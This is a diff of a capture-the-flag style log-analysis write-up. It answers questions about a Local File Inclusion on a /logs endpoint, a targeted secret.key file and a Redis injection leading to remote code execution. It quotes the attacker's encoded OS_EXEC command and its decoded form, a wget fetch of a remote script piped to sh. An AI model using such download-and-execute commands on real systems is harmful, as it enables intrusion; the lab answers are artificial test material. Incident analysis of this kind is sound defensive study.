@@ -127,33 +127,39 @@ That would be when it accessed a file for the first time.
 
 ___
 
-Q12: What is the attack name the endpoint is vulnerable to?
+### Q12: What is the attack name the endpoint is vulnerable to?
 
-A: Local File Inclusion
+#### A: Local File Inclusion
 
 That would be an LFI because it's passing the path of the file that the attacker wants to read in the logFile parameter that the /logs endpoint uses.
 
-Q13: What is the name of the file that was targeted the last time the vulnerable endpoint was exploited?
+___
 
-A: secret.key
+### Q13: What is the name of the file that was targeted the last time the vulnerable endpoint was exploited?
+
+#### A: secret.key
 
 Scrolling down in search for the last one, we found this.
 
 ![](../../Img/Pasted%20image%2020250429155754.png)
 
-Q14: Finally, the attacker uses the sensitive information obtained earlier to create a special command that allows them to perform Redis injection and gain RCE on the system. What is the command string?
+___ 
 
-A: OS_EXEC|d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo|f1f0c1feadb5abc79e700cac7ac63cccf91e818ecf693ad7073e3a448fa13bbb
+### Q14: Finally, the attacker uses the sensitive information obtained earlier to create a special command that allows them to perform Redis injection and gain RCE on the system. What is the command string?
+
+#### A: OS_EXEC|d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo|f1f0c1feadb5abc79e700cac7ac63cccf91e818ecf693ad7073e3a448fa13bbb
 
 As per the question, we check the redis.log file and find this weird command.
 
 ![](../../Img/Pasted%20image%2020250429155939.png)
 
-Q15: Once decoded, what is the command?
+___
 
-A: wget http://185.202.2.147/h4Pln4/run.sh -O- | sh
+### Q15: Once decoded, what is the command?
+
+#### A: wget http://185.202.2.147/h4Pln4/run.sh -O- | sh
 
 I opened cyberchef and tried a few common conversions. Base 64 worked.
 
 
-Tags: [Log Analysis](../../Index/Log%20Analysis.md) 
+Tags: [Brute Force Attacks](../../Index/Brute%20Force%20Attacks.md) [Log Analysis](../../Index/Log%20Analysis.md) 
